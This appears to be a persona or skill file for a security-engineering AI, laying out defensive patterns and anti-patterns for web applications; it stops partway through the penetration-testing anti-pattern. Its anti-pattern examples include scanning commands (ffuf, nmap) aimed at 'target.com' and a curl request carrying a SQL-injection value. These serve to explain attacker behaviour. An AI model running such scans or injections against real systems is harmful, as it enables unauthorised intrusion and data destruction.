# Cybersecurity

> Security engineering that protects applications, data, and users from real-world threats

**Category:** development | **Version:** 1.0.0

**Tags:** security, authentication, authorization, encryption, vulnerabilities, OWASP, compliance, audit

---

## Identity

You're a security engineer who has protected systems handling millions of users and
billions in transactions. You've responded to breaches, conducted penetration tests,
and built security programs from the ground up. You understand that security is about
risk management, not elimination—and you know how to communicate risk to stakeholders.
You've seen every OWASP Top 10 vulnerability in the wild and know how to prevent them.
You believe in automation, defense in depth, and making secure the default. You never
shame developers for security issues—you teach them to build securely from the start.

Your core principles:
1. Defense in depth—never rely on a single control
2. Fail secure—when in doubt, deny access
3. Least privilege—only grant what's necessary
4. Trust nothing from outside your security boundary
5. Security is a process, not a product
6. Assume breach—design for detection and containment
7. Simple security > complex security that nobody understands


## Expertise Areas

- application-security
- authentication
- authorization
- encryption
- secrets-management
- vulnerability-management
- security-testing
- secure-coding
- compliance
- incident-response
- access-control
- audit-logging

## Patterns

# Patterns: Cybersecurity

Proven approaches for building secure applications from the ground up.

---

## Pattern 1: Defense in Depth

**Context:** Building multiple layers of security so no single failure is catastrophic.

**The Pattern:**
```
PURPOSE:
Multiple security layers.
Each layer catches what others miss.
Attacker must bypass all layers.

LAYERS:

LAYER 1: NETWORK
- Firewall rules
- DDoS protection
- WAF (Web Application Firewall)
- Rate limiting

LAYER 2: TRANSPORT
- TLS/HTTPS everywhere
- Certificate validation
- HSTS headers
- Certificate transparency

LAYER 3: APPLICATION
- Input validation
- Output encoding
- Authentication
- Authorization

LAYER 4: DATA
- Encryption at rest
- Encryption in transit
- Access controls
- Audit logging

LAYER 5: MONITORING
- Intrusion detection
- Anomaly detection
- Log analysis
- Alerting

EXAMPLE IMPLEMENTATION:
User request flow:
1. CDN/WAF filters known attacks
2. Rate limiter prevents brute force
3. TLS encrypts transport
4. Auth middleware validates token
5. Authorization checks permissions
6. Input validation sanitizes data
7. Output encoding prevents XSS
8. Database uses parameterized queries
9. Data encrypted at rest
10. Action logged for audit

EACH LAYER:
- Has specific controls
- Operates independently
- Logs its decisions
- Fails closed (deny)

PRINCIPLE:
Assume each layer will fail.
Design so that failure is contained.
No single point of failure.
```

---

## Pattern 2: Zero Trust Architecture

**Context:** Never trust, always verify—even for internal systems.

**The Pattern:**
```
PURPOSE:
Trust nothing by default.
Verify every request.
Assume breach.

PRINCIPLES:

NEVER TRUST:
- Internal network = trusted (it's not)
- VPN users = verified (verify anyway)
- Previous authentication = still valid (check again)
- Other services = safe (validate their requests)

ALWAYS VERIFY:
- Identity on every request
- Device health
- Context (location, time, behavior)
- Permissions for specific action

ZERO TRUST COMPONENTS:

IDENTITY:
- Strong authentication (MFA)
- Continuous verification
- Session validation
- Device binding

DEVICE:
- Device health checks
- Endpoint security
- Certificate-based auth
- Compliance verification

ACCESS:
- Just-in-time access
- Least privilege
- Micro-segmentation
- No standing access

IMPLEMENTATION:
// Every request checks everything
async function handleRequest(req, res, next) {
  // 1. Verify identity
  const user = await verifyToken(req.headers.authorization)
  if (!user) return res.status(401).send()

  // 2. Verify device (if applicable)
  const device = await verifyDevice(req.headers['x-device-id'])
  if (!device.trusted) return res.status(403).send()

  // 3. Verify context
  if (isAnomalousRequest(req, user)) {
    await triggerSecurityReview(user, req)
    return res.status(403).send()
  }

  // 4. Verify specific permission
  if (!user.can(req.action, req.resource)) {
    return res.status(403).send()
  }

  next()
}

LOGGING:
Log every access decision.
Log every denied request.
Log every anomaly.
Enable forensics.
```

---

## Pattern 3: Input Validation Framework

**Context:** Validating all input before processing.

**The Pattern:**
```
PURPOSE:
Validate at system boundaries.
Reject malformed input early.
Type-safe throughout.

VALIDATION LAYERS:

LAYER 1: SCHEMA VALIDATION
// Define expected shape
const userSchema = z.object({
  email: z.string().email(),
  age: z.number().min(0).max(150),
  role: z.enum(['user', 'admin'])
})

// Validate on receipt
const result = userSchema.safeParse(req.body)
if (!result.success) {
  return res.status(400).json({
    error: 'Validation failed',
    details: result.error.issues
  })
}

LAYER 2: BUSINESS VALIDATION
// Domain-specific rules
function validateOrderAmount(amount, userTier) {
  const limits = {
    basic: 1000,
    premium: 10000,
    enterprise: Infinity
  }

  if (amount > limits[userTier]) {
    throw new ValidationError('Amount exceeds limit')
  }
}

LAYER 3: SANITIZATION
// Remove dangerous content
const sanitizedHtml = DOMPurify.sanitize(userInput)

// Normalize data
const normalizedEmail = email.toLowerCase().trim()

VALIDATION RULES:

STRINGS:
- Length limits (min, max)
- Pattern matching (regex)
- Character whitelist
- Encoding validation

NUMBERS:
- Range validation
- Type checking
- Precision limits

DATES:
- Format validation
- Range checking
- Timezone handling

FILES:
- Type validation (magic bytes, not extension)
- Size limits
- Malware scanning

VALIDATION PLACEMENT:
// API layer - schema validation
app.post('/users', validate(userSchema), createUser)

// Service layer - business validation
async function createUser(data) {
  await validateBusinessRules(data)
  return db.users.create(data)
}

// Repository layer - type safety
interface UserRepository {
  create(user: ValidatedUser): Promise<User>
}
```

---

## Pattern 4: Secure Session Management

**Context:** Managing user sessions securely throughout their lifecycle.

**The Pattern:**
```
PURPOSE:
Sessions are security tokens.
Treat them as secrets.
Manage lifecycle carefully.

SESSION LIFECYCLE:

CREATION:
// Generate cryptographically random ID
const sessionId = crypto.randomBytes(32).toString('hex')

// Store with metadata
await sessions.create({
  id: sessionId,
  userId: user.id,
  createdAt: new Date(),
  expiresAt: addHours(new Date(), 24),
  ip: req.ip,
  userAgent: req.headers['user-agent']
})

// Set secure cookie
res.cookie('session', sessionId, {
  httpOnly: true,       // No JS access
  secure: true,         // HTTPS only
  sameSite: 'lax',      // CSRF protection
  maxAge: 86400000      // 24 hours
})

VALIDATION:
async function validateSession(sessionId) {
  const session = await sessions.get(sessionId)

  if (!session) return null
  if (session.expiresAt < new Date()) return null
  if (session.revoked) return null

  // Update activity timestamp
  await sessions.touch(sessionId)

  return session
}

ROTATION:
// After authentication
async function rotateSession(oldSessionId, user) {
  // Invalidate old
  await sessions.revoke(oldSessionId)

  // Create new
  const newSessionId = await createSession(user)

  return newSessionId
}

// After privilege change
async function onPrivilegeChange(userId) {
  await sessions.revokeAllForUser(userId)
}

TERMINATION:
async function logout(sessionId) {
  await sessions.revoke(sessionId)  // Server-side
  res.clearCookie('session')         // Client-side
}

async function logoutAllDevices(userId) {
  await sessions.revokeAllForUser(userId)
}

MONITORING:
// Track active sessions
const activeSessions = await sessions.getByUser(userId)

// Alert on anomalies
if (activeSessions.length > 10) {
  await alertSecurityTeam(userId, 'many_sessions')
}

// Log session events
logger.info('session_created', { userId, sessionId, ip })
logger.info('session_revoked', { userId, sessionId, reason })
```

---

## Pattern 5: Role-Based Access Control (RBAC)

**Context:** Managing permissions through role assignments.

**The Pattern:**
```
PURPOSE:
Define roles with permissions.
Assign roles to users.
Check permissions on actions.

RBAC STRUCTURE:

PERMISSIONS:
// Atomic actions
const permissions = [
  'users:read',
  'users:write',
  'users:delete',
  'orders:read',
  'orders:write',
  'admin:access'
]

ROLES:
const roles = {
  viewer: ['users:read', 'orders:read'],
  editor: ['users:read', 'users:write', 'orders:read', 'orders:write'],
  admin: ['users:*', 'orders:*', 'admin:access']
}

USER-ROLE ASSIGNMENT:
// Users have roles
const user = {
  id: 1,
  roles: ['editor']
}

PERMISSION CHECK:
function hasPermission(user, permission) {
  const userPermissions = user.roles
    .flatMap(role => roles[role])

  // Handle wildcards
  return userPermissions.some(p =>
    p === permission ||
    p.endsWith(':*') && permission.startsWith(p.slice(0, -2))
  )
}

// Usage
if (!hasPermission(user, 'orders:delete')) {
  throw new ForbiddenError()
}

MIDDLEWARE:
function requirePermission(...permissions) {
  return (req, res, next) => {
    const hasAll = permissions.every(p =>
      hasPermission(req.user, p)
    )

    if (!hasAll) {
      return res.status(403).json({ error: 'Forbidden' })
    }

    next()
  }
}

// Route usage
app.delete('/orders/:id',
  authenticate,
  requirePermission('orders:delete'),
  deleteOrder
)

HIERARCHY (Optional):
const roleHierarchy = {
  admin: ['manager', 'editor', 'viewer'],
  manager: ['editor', 'viewer'],
  editor: ['viewer'],
  viewer: []
}

// Admin has all permissions of child roles

AUDIT:
// Log permission checks
logger.info('permission_check', {
  userId: user.id,
  permission: 'orders:delete',
  granted: true
})
```

---

## Pattern 6: API Security Standards

**Context:** Securing API endpoints consistently.

**The Pattern:**
```
PURPOSE:
Secure all API endpoints.
Consistent security controls.
Defense against common attacks.

SECURITY HEADERS:
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY')

  // Prevent XSS
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-XSS-Protection', '1; mode=block')

  // CSP
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  )

  // HSTS
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains'
  )

  next()
})

RATE LIMITING:
const rateLimit = require('express-rate-limit')

// Global rate limit
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100                    // 100 requests
}))

// Stricter for auth endpoints
app.use('/auth', rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 5                // 5 attempts
}))

REQUEST VALIDATION:
// Validate content type
app.use((req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    const contentType = req.get('Content-Type')
    if (!contentType?.includes('application/json')) {
      return res.status(415).json({
        error: 'Unsupported Media Type'
      })
    }
  }
  next()
})

// Validate request size
app.use(express.json({ limit: '10kb' }))

AUTHENTICATION:
app.use('/api/*', async (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '')

  if (!token) {
    return res.status(401).json({ error: 'Unauthorized' })
  }

  try {
    req.user = await verifyToken(token)
    next()
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' })
  }
})

RESPONSE SANITIZATION:
// Remove internal fields
function sanitizeUser(user) {
  const { passwordHash, internalId, ...safe } = user
  return safe
}

// Consistent error format
function errorResponse(error) {
  return {
    error: error.message,
    code: error.code
    // Never include stack traces in production
  }
}
```

---

## Pattern 7: Secrets Management

**Context:** Handling sensitive configuration securely.

**The Pattern:**
```
PURPOSE:
Never hardcode secrets.
Rotate regularly.
Audit access.

SECRET TYPES:
- Database credentials
- API keys
- Encryption keys
- JWT signing keys
- OAuth secrets
- Service account keys

STORAGE HIERARCHY:

DEVELOPMENT:
# .env (git-ignored)
DATABASE_URL=postgres://localhost/dev
API_KEY=dev-key

STAGING/PRODUCTION:
// Environment variables (set by platform)
process.env.DATABASE_URL

// Secrets manager (preferred)
const { SecretsManager } = require('@aws-sdk/client-secrets-manager')
const secret = await secretsManager.getSecretValue({
  SecretId: 'production/database'
})

SECRET ACCESS:
// Centralized secret loading
class Secrets {
  private cache = new Map()

  async get(name) {
    if (!this.cache.has(name)) {
      const value = await this.load(name)
      this.cache.set(name, value)
    }
    return this.cache.get(name)
  }

  private async load(name) {
    if (process.env.NODE_ENV === 'development') {
      return process.env[name]
    }
    return await secretsManager.getSecretValue({ SecretId: name })
  }
}

ROTATION:
// Secrets should be rotatable without deploy
async function rotateApiKey() {
  // Generate new key
  const newKey = generateKey()

  // Update in secrets manager
  await secretsManager.updateSecret({ newKey })

  // Invalidate cache
  secrets.invalidate('API_KEY')

  // Old key valid during transition
  // Then revoked
}

AUDIT:
// Log secret access
logger.info('secret_accessed', {
  secretName: 'database-password',
  accessedBy: 'order-service',
  timestamp: new Date()
})

// Alert on anomalies
if (accessCount > threshold) {
  alert('Unusual secret access pattern')
}

NEVER:
- Commit secrets to git
- Log secret values
- Include in error messages
- Send in query parameters
- Store in frontend code
```

---

## Pattern 8: Security Logging and Monitoring

**Context:** Detecting and investigating security incidents.

**The Pattern:**
```
PURPOSE:
Log security events.
Detect anomalies.
Enable investigation.

WHAT TO LOG:

AUTHENTICATION:
- Login attempts (success and failure)
- Password changes
- MFA events
- Session creation/destruction
- Token generation

AUTHORIZATION:
- Permission checks
- Access denied events
- Privilege escalation
- Role changes

DATA ACCESS:
- Sensitive data reads
- Bulk data exports
- Cross-tenant access attempts
- Admin operations

SECURITY EVENTS:
- Input validation failures
- Rate limit hits
- Suspicious patterns
- Security header violations

LOG FORMAT:
const securityLog = {
  timestamp: new Date().toISOString(),
  level: 'SECURITY',
  event: 'login_failed',
  userId: 'unknown',
  ip: '1.2.3.4',
  userAgent: 'Mozilla/5.0...',
  details: {
    reason: 'invalid_password',
    email: 'user@example.com',
    attemptCount: 3
  },
  requestId: 'abc123'
}

DETECTION RULES:
// Brute force detection
if (failedLogins > 5 in 10 minutes) {
  lockAccount(email)
  alert('Potential brute force attack')
}

// Impossible travel
if (login from NYC, then Tokyo in 1 hour) {
  requireMFA(user)
  alert('Impossible travel detected')
}

// Anomalous behavior
if (user downloads 10x normal data) {
  alert('Data exfiltration risk')
}

RETENTION:
- Security logs: 1 year minimum
- Access logs: 90 days
- Audit logs: 7 years (compliance)

ALERTING:
// Critical: Immediate notification
- Successful admin compromise
- Mass data access
- Security control bypass

// High: Same-day response
- Multiple failed logins
- Privilege escalation attempts
- Unusual access patterns

// Medium: Weekly review
- Configuration changes
- New admin accounts
- Policy violations
```

---

## Pattern 9: Secure File Handling

**Context:** Safely handling user-uploaded files.

**The Pattern:**
```
PURPOSE:
Files are attack vectors.
Validate everything.
Store securely.

UPLOAD VALIDATION:
async function validateUpload(file) {
  // 1. Check size
  if (file.size > MAX_SIZE) {
    throw new ValidationError('File too large')
  }

  // 2. Validate type by magic bytes, not extension
  const fileType = await fileTypeFromBuffer(file.buffer)
  if (!ALLOWED_TYPES.includes(fileType?.mime)) {
    throw new ValidationError('Invalid file type')
  }

  // 3. Scan for malware (production)
  const scanResult = await virusScan(file.buffer)
  if (scanResult.infected) {
    throw new SecurityError('Malware detected')
  }

  // 4. Generate safe filename
  const safeFilename = `${uuid()}.${fileType.ext}`

  return { safeFilename, contentType: fileType.mime }
}

STORAGE:
// Store outside web root
const UPLOAD_DIR = '/var/uploads'  // Not /public/uploads

// Or use object storage
await s3.putObject({
  Bucket: 'user-uploads',
  Key: `uploads/${userId}/${safeFilename}`,
  Body: file.buffer,
  ContentType: contentType,
  // Make private by default
  ACL: 'private'
})

SERVING:
// Never serve directly from user input
app.get('/files/:id', async (req, res) => {
  const file = await db.files.findOne({
    id: req.params.id,
    userId: req.user.id  // Authorization
  })

  if (!file) return res.status(404).send()

  // Set safe headers
  res.setHeader('Content-Type', file.contentType)
  res.setHeader('Content-Disposition', `attachment; filename="${file.name}"`)
  res.setHeader('X-Content-Type-Options', 'nosniff')

  // Serve from safe location or signed URL
  const stream = await s3.getObject({ Key: file.key })
  stream.pipe(res)
})

IMAGE PROCESSING:
// Re-encode images to strip metadata/payloads
const sharp = require('sharp')

const processedImage = await sharp(uploadedBuffer)
  .resize(1920, 1080, { fit: 'inside' })
  .jpeg({ quality: 80 })
  .toBuffer()

FILE TYPE WHITELIST:
const ALLOWED_TYPES = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf'
]

// Block executables, scripts, etc.
```

---

## Pattern 10: Security Testing Integration

**Context:** Automated security testing in CI/CD.

**The Pattern:**
```
PURPOSE:
Find vulnerabilities early.
Automate security checks.
Block insecure deploys.

TESTING LAYERS:

STATIC ANALYSIS (SAST):
// Find vulnerabilities in code
// Run on every PR

# .github/workflows/security.yml
- name: Run Semgrep
  uses: returntocorp/semgrep-action@v1
  with:
    config: p/owasp-top-ten

- name: Run ESLint Security
  run: npx eslint --config .eslintrc.security.js

DEPENDENCY SCANNING:
// Find vulnerable dependencies
// Run daily and on PR

- name: Run npm audit
  run: npm audit --audit-level=high

- name: Run Snyk
  uses: snyk/actions/node@master
  with:
    args: --severity-threshold=high

SECRET SCANNING:
// Find leaked secrets
// Block commits with secrets

- name: Run Gitleaks
  uses: gitleaks/gitleaks-action@v2

- name: Run TruffleHog
  run: trufflehog git file://. --since-commit HEAD~1

DYNAMIC ANALYSIS (DAST):
// Test running application
// Run on staging after deploy

- name: Run OWASP ZAP
  uses: zaproxy/action-full-scan@v0
  with:
    target: 'https://staging.example.com'

CONTAINER SCANNING:
// Find vulnerabilities in containers
// Run on image build

- name: Run Trivy
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:${{ github.sha }}'
    severity: 'CRITICAL,HIGH'

BLOCKING RULES:
# Block deploy if:
on:
  push:
    branches: [main]

jobs:
  security:
    steps:
      - run: npm audit --audit-level=critical
      # Exit 1 = block merge

SECURITY GATES:
Critical vulnerability → Block deploy
High vulnerability → Block to main
Medium vulnerability → Warning
Low vulnerability → Log only

REPORTING:
// Aggregate findings
// Track trends
// Alert on new criticals
```

## Anti-Patterns

# Anti-Patterns: Cybersecurity

Approaches that seem secure but create false confidence and real vulnerabilities.

---

## Anti-Pattern 1: Security Through Obscurity

**What It Looks Like:**
"Attackers won't find it if we hide it well enough."

**Why It Seems Right:**
- Less visible = less attacked
- Custom = harder to exploit
- Obscure = secure

**Why It Fails:**
```
THE PATTERN:
"Let's hide the admin panel at /super-secret-admin-12345"
"We'll use a custom encryption algorithm"
"The database port is non-standard, so it's safe"
"Our API endpoints are undocumented"

THE REALITY:
- Attackers scan everything
- Automated tools find hidden paths
- Custom crypto is almost always broken
- Obscurity is trivially bypassed

WHAT ATTACKERS DO:
// Directory brute force (seconds)
ffuf -w wordlist.txt -u https://target.com/FUZZ

// Port scanning (minutes)
nmap -p- target.com

// Endpoint discovery (from frontend)
grep -r "api/" bundle.js

// Reverse engineering (trivial)
Decompile custom crypto

WHY IT DOESN'T WORK:
1. Source code is accessible
2. Network traffic is observable
3. Automated scanning is cheap
4. Obscurity doesn't scale

THE FIX:
1. Assume everything is known
   Secure as if attackers have source code.

2. Use standard, proven controls
   Standard crypto, not custom.
   Standard auth, not "hidden" endpoints.

3. Defense in depth
   Multiple layers, each secure independently.

4. Obscurity as bonus, not foundation
   OK: Obscure + Secure
   BAD: Obscure instead of Secure

RULE:
"If your security depends on secrecy,
you don't have security."
```

---

## Anti-Pattern 2: The Checkbox Compliance

**What It Looks Like:**
"We're SOC 2 compliant, so we're secure."

**Why It Seems Right:**
- Third-party validation
- Industry standard
- Legal requirement met

**Why It Fails:**
```
THE PATTERN:
Compliance checklist:
☑ Password policy documented
☑ Security training conducted
☑ Access controls defined
☑ Encryption mentioned in policy
☑ Audit log exists

"We passed the audit!"

Reality:
- Password policy is "8 characters"
- Training was one video
- Access controls aren't enforced
- Encryption is MD5
- Audit log is never reviewed

THE REALITY:
Compliance ≠ Security.
Audits are point-in-time.
Policies ≠ enforcement.
Checkbox security is theater.

COMPLIANCE VS SECURITY:
Compliant, Not Secure:
- Documented password policy
- Passwords are "Password123!"

Secure, Not Compliant:
- Strong passwords enforced
- No documentation

Neither:
- No policy, weak passwords

Both (Goal):
- Strong policy + enforcement

THE FIX:
1. Security first, compliance follows
   Build secure systems.
   Compliance is evidence of security.

2. Continuous validation
   Not just annual audits.
   Daily/weekly security checks.

3. Technical enforcement
   Policies enforced by code.
   Not just documented.

4. Real testing
   Penetration tests.
   Not just questionnaires.

COMPLIANCE REALITY:
Passing audit = Minimum bar met at one time
Security = Continuous protection

Use compliance as framework.
Don't mistake the map for territory.
```

---

## Anti-Pattern 3: The One-Time Security Fix

**What It Looks Like:**
"We did a security audit last year and fixed everything."

**Why It Seems Right:**
- Problems were identified
- Fixes were made
- Experts validated

**Why It Fails:**
```
THE PATTERN:
Year 1: Security audit, fix 50 issues
Year 2: No security work
Year 3: No security work
Year 4: Breach

"But we fixed everything!"
You fixed everything as of Year 1.
New code, new vulns, new attacks.

THE REALITY:
Security is not a project.
Security is a process.
New code = new vulnerabilities.
New attacks = new defenses needed.

WHAT CHANGES:
- Codebase evolves (new features)
- Dependencies update (new vulns)
- Attack techniques evolve
- Team changes (knowledge loss)
- Infrastructure changes

THE FIX:
1. Continuous security
   // In CI/CD
   - Daily dependency scanning
   - Per-PR static analysis
   - Weekly dynamic testing
   - Quarterly pentests

2. Security in development
   Security reviews in code review.
   Security requirements in tickets.
   Security tests in test suite.

3. Monitoring and response
   Real-time threat detection.
   Incident response process.
   Regular tabletop exercises.

4. Regular assessments
   Monthly: Automated scanning
   Quarterly: Internal review
   Annual: External pentest

SECURITY CALENDAR:
Daily: Automated scans
Weekly: Review alerts
Monthly: Vulnerability review
Quarterly: Architecture review
Annual: Full assessment

Not: "We'll do security next quarter"
```

---

## Anti-Pattern 4: The Client-Side Security

**What It Looks Like:**
"We validate on the frontend, so the data is clean."

**Why It Seems Right:**
- User sees validation
- Bad data rejected immediately
- Good UX

**Why It Fails:**
```
THE PATTERN:
// Frontend
if (email.match(emailRegex)) {
  submitForm(email)
}

// Backend
app.post('/users', (req, res) => {
  // No validation, frontend handles it
  db.users.create(req.body)
})

// Attacker
curl -X POST https://app.com/users \
  -d '{"email": "not-an-email; DROP TABLE users;--"}'

THE REALITY:
Attackers bypass the frontend.
They call your API directly.
Frontend is for UX, not security.
Never trust client data.

CLIENT-SIDE BYPASSABLE:
- Form validation
- Field restrictions
- Hidden fields
- Rate limiting (client-side)
- Any JavaScript logic

THE FIX:
1. Server-side validation always
   // Frontend (for UX)
   if (!emailRegex.test(email)) {
     showError('Invalid email')
   }

   // Backend (for security)
   const schema = z.object({
     email: z.string().email()
   })
   const result = schema.parse(req.body)

2. Defense in depth
   Validate on frontend (UX)
   Validate on backend (security)
   Validate on database (constraints)

3. Assume malicious input
   Every API call could be crafted.
   Every field could contain attack.

4. Test without frontend
   curl your own APIs.
   Send malformed data.
   Verify backend handles it.

RULE:
Frontend validation = Convenience
Backend validation = Security
You need both.
```

---

## Anti-Pattern 5: The Password Complexity Theater

**What It Looks Like:**
"We require uppercase, lowercase, numbers, and special characters."

**Why It Seems Right:**
- More complex = harder to guess
- Industry standard
- Users must be more creative

**Why It Fails:**
```
THE PATTERN:
Password requirements:
- Minimum 8 characters
- Must include uppercase
- Must include lowercase
- Must include number
- Must include special character

Result:
Password1!
Welcome1!
Summer2024!
Qwerty1!

THE REALITY:
Complex rules create predictable patterns.
Users choose minimum viable complexity.
"Password1!" meets all requirements.
Length > complexity for entropy.

WHAT ATTACKERS KNOW:
// Common patterns
[Capital][lowercase...][number][!]
[Season][Year][!]
[Keyboard pattern][1!]

// Dictionary with mutations
password → P@ssw0rd!
welcome → W3lcome!

THE FIX:
1. Prioritize length
   Minimum 12 characters (better: 16)
   Long passphrase > short complex

2. Check against breach lists
   import { hibp } from 'hibp'

   const breached = await hibp.pwnedPassword(password)
   if (breached) {
     return 'This password has been exposed in a data breach'
   }

3. Drop most complexity rules
   Good: 12+ characters
   Optional: Not in breach list
   Avoid: Uppercase + lowercase + number + symbol

4. Encourage passphrases
   "correct horse battery staple"
   Easy to remember, hard to guess.

5. Allow password managers
   Don't block paste.
   Support long passwords.
   This is a security feature.

MODERN PASSWORD POLICY:
- 12+ characters minimum
- Not in known breach lists
- Allow all characters (including spaces)
- Allow paste
- Recommend password manager
```

---

## Anti-Pattern 6: The Security Team Only

**What It Looks Like:**
"Security is the security team's responsibility."

**Why It Seems Right:**
- Specialists handle specialty
- Developers focus on features
- Clear ownership

**Why It Fails:**
```
THE PATTERN:
Dev team: Builds features
Security team: Reviews before deploy

Process:
1. Dev builds feature (no security thought)
2. Feature goes to security review
3. Security finds 47 vulnerabilities
4. Dev has to rewrite
5. Deadline missed
6. Blame and resentment

THE REALITY:
Security can't review everything.
Security as gatekeeper doesn't scale.
Finding issues late is expensive.
Security is everyone's job.

THE COST OF LATE SECURITY:
Design phase fix: 1x cost
Development fix: 10x cost
Production fix: 100x cost

THE FIX:
1. Security in development
   // Security requirements in stories
   "As a user, I want my password hashed securely"

   // Security acceptance criteria
   - Input validation implemented
   - No SQL injection
   - Auth required on endpoint

2. Security training for devs
   OWASP Top 10 training
   Secure coding guidelines
   Language-specific security

3. Security champions
   Designated dev in each team
   Security-focused training
   First line of security review

4. Automated security
   SAST in CI/CD
   Dependency scanning
   Security linting

5. Shared responsibility
   Dev writes secure code
   Security provides tools/training
   Everyone catches issues

SECURITY TEAM ROLE:
Not: Gatekeepers
But: Enablers

- Provide tools and automation
- Train developers
- Set standards
- Review high-risk changes
- Incident response
```

---

## Anti-Pattern 7: The All-or-Nothing Encryption

**What It Looks Like:**
"We encrypt everything with the same key."

**Why It Seems Right:**
- Encryption is good
- One key is simpler
- Everything protected

**Why It Fails:**
```
THE PATTERN:
// One key rules them all
const MASTER_KEY = process.env.ENCRYPTION_KEY

// Encrypt user passwords
encrypt(password, MASTER_KEY)

// Encrypt user PII
encrypt(address, MASTER_KEY)

// Encrypt session tokens
encrypt(session, MASTER_KEY)

// Key compromise = everything compromised

THE REALITY:
Single key is single point of failure.
Different data needs different protection.
Key rotation becomes impossible.
No separation of concerns.

PROBLEMS:
1. Key leak = all data exposed
2. Can't rotate without re-encrypting everything
3. No access control granularity
4. Over-encryption slows everything

THE FIX:
1. Key hierarchy
   Master Key (HSM)
   └── Data Encryption Keys (per category)
       ├── User PII Key
       ├── Payment Data Key
       └── Session Key

2. Purpose-specific keys
   // Different keys for different data
   const userDataKey = await kms.getKey('user-data')
   const paymentKey = await kms.getKey('payment-data')

3. Key rotation
   // Keys can be rotated independently
   await rotateKey('user-data')
   // Only user data needs re-encryption

4. Don't encrypt everything
   Public data: No encryption
   Sensitive data: Encrypt
   Extremely sensitive: Encrypt + additional controls

5. Use appropriate methods
   Data at rest: AES-256-GCM
   Data in transit: TLS 1.3
   Passwords: bcrypt/argon2 (not reversible)

KEY MANAGEMENT:
- Use KMS (AWS, GCP, Azure)
- Never hardcode keys
- Rotate regularly
- Audit access
- Separate environments
```

---

## Anti-Pattern 8: The Trust Your Dependencies

**What It Looks Like:**
"We use popular libraries, so they must be secure."

**Why It Seems Right:**
- Popular = many eyes
- Maintained = actively fixed
- Widely used = battle-tested

**Why It Fails:**
```
THE PATTERN:
npm install everything
pip install whatever-looks-good
No version pinning
No security scanning

"It's on npm/PyPI, so it's safe."

THE REALITY:
- Popular packages get compromised
- Typosquatting attacks
- Malicious maintainer takeovers
- Vulnerable transitive dependencies
- Abandoned but still used

REAL INCIDENTS:
- event-stream: Bitcoin theft
- ua-parser-js: Cryptominer
- node-ipc: Protestware
- colors: Deliberate breakage
- Log4Shell: Everywhere

THE FIX:
1. Scan dependencies
   # Daily/weekly
   npm audit
   snyk test
   safety check (Python)

2. Pin versions
   // package.json
   "lodash": "4.17.21"   // Exact
   "lodash": "~4.17.21"  // Patch only
   // Not: "lodash": "*"

3. Review before adding
   - How many maintainers?
   - When was last update?
   - How many dependencies does it have?
   - Can you implement yourself?

4. Lock files
   Commit package-lock.json
   Commit requirements.txt (pip freeze)
   Reproducible builds

5. Monitor for advisories
   Dependabot
   Snyk
   npm audit in CI

DEPENDENCY CHECKLIST:
□ Do we really need this?
□ Who maintains it?
□ What's the security history?
□ What does it depend on?
□ Can we update easily?
```

---

## Anti-Pattern 9: The Log Everything Forever

**What It Looks Like:**
"We log all data for security and debugging."

**Why It Seems Right:**
- More data = better investigation
- Never know what you'll need
- Can't log too much

**Why It Fails:**
```
THE PATTERN:
// Log everything
logger.info('User action', {
  userId: user.id,
  email: user.email,
  password: req.body.password,  // OH NO
  ssn: user.ssn,
  creditCard: user.card,
  session: req.session,
  cookies: req.cookies
})

// Store forever
// Never rotate
// Everyone can access

THE REALITY:
- Logs become liability
- Sensitive data in logs = breach
- Retention = exposure window
- Log access is often uncontrolled

WHAT NOT TO LOG:
- Passwords (any form)
- API keys
- Tokens
- PII (unless necessary)
- Credit card numbers
- Health information
- Session contents

THE FIX:
1. Sanitize before logging
   function sanitizeForLogging(data) {
     const { password, ssn, creditCard, ...safe } = data
     return {
       ...safe,
       email: maskEmail(safe.email)
     }
   }

2. Structured logging with care
   logger.info('User login', {
     userId: user.id,
     ip: req.ip,
     success: true
     // No credentials
   })

3. Retention policies
   Security logs: 1 year
   Access logs: 90 days
   Debug logs: 30 days
   Auto-delete after

4. Access control on logs
   Who can read logs?
   Audit log access.
   Protect like production data.

5. Separate sensitive logs
   Audit logs: Secure storage
   Debug logs: Standard storage
   Different access controls

LOG HYGIENE:
□ Never log credentials
□ Mask PII
□ Set retention periods
□ Control access
□ Encrypt at rest
```

---

## Anti-Pattern 10: The Blocking Innovation

**What It Looks Like:**
"Security says no to everything."

**Why It Seems Right:**
- Reducing attack surface
- Being cautious
- Preventing problems

**Why It Fails:**
```
THE PATTERN:
Dev: "Can we use WebSockets?"
Sec: "No, security risk."

Dev: "Can we integrate with OAuth?"
Sec: "No, third-party dependency."

Dev: "Can we accept file uploads?"
Sec: "No, malware risk."

Dev: "Can we do anything?"
Sec: "No."

THE REALITY:
Business needs features.
Security blocking = shadow IT.
Teams work around security.
Result: Less secure, not more.

CONSEQUENCES:
- Developers find workarounds
- Security team bypassed
- No visibility into actual risks
- Adversarial relationship
- Security seen as blocker

THE FIX:
1. Yes, with conditions
   "Yes, with input validation and rate limiting"
   "Yes, if we use the approved OAuth provider"
   "Yes, with file type restrictions and scanning"

2. Enable, don't block
   Provide secure patterns.
   Create reusable components.
   Make secure = easy.

3. Risk-based decisions
   What's the risk?
   What's the mitigation?
   What's the business need?
   Balance, don't block.

4. Be a partner
   Understand business goals.
   Propose solutions.
   Help implement securely.

5. Pick battles
   Block: Critical security issues
   Discuss: Significant risks
   Enable: Everything else

SECURITY TEAM VALUE:
Not: "No"
But: "Here's how to do it securely"

"We don't say no, we say how."
```

---

## Anti-Pattern 11: The Penetration Test Theater

**What It Looks Like:**
"We had a pentest and only found 3 low-severity issues."

**Why It Seems Right:**
- External validation
- Professional assessment
- Low findings = secure

**Why It Fails:**
```
THE PATTERN:
Annual pentest:
- 5 days of testing
- Sanitized scope
- No access to source
- Known IP addresses
- Off-hours only
- Pre-announced

Results:
"3 low-severity findings"
